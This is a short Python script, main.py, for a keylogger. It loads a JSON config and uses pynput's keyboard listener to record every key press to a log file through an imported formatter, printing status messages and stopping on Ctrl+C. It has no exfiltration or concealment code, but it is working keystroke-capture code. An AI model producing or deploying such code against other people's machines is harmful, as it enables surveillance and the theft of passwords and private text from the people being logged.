# main.py
from pynput import keyboard
import json
import os
from log_formatter import on_key_press

# Get the absolute path to the configuration file
config_file_path = os.path.join(os.path.dirname(__file__), 'config/settings.json')

# Load the configuration
with open(config_file_path) as f:
    config = json.load(f)

# Retrieve configuration settings
log_file = config.get('log_file', 'keystrokes_log.txt')  # Make sure 'log_file' matches the key in settings.json
log_format = config.get('log_format', '[SPACE]')
enable_feature1 = config.get('enable_feature1', False)
feature1_settings = config.get('feature1_settings', {})
enable_feature2 = config.get('enable_feature2', False)

def main():
    print("Starting keylogger...")
    
    def on_key(key):
        try:
            on_key_press(log_file, key)  # Pass both log_file and key as arguments
        except Exception as e:
            print("Error writing to file:", e)

    try:
        with keyboard.Listener(on_press=on_key) as listener:
            print("Keylogger is now running. Press Ctrl+C to stop logging.")
            listener.join()
    except KeyboardInterrupt:
        print("\nKeylogger has been stopped.")

    print("Stopping keylogger...")
    print("Keylogger has been stopped.")

if __name__ == '__main__':
    main()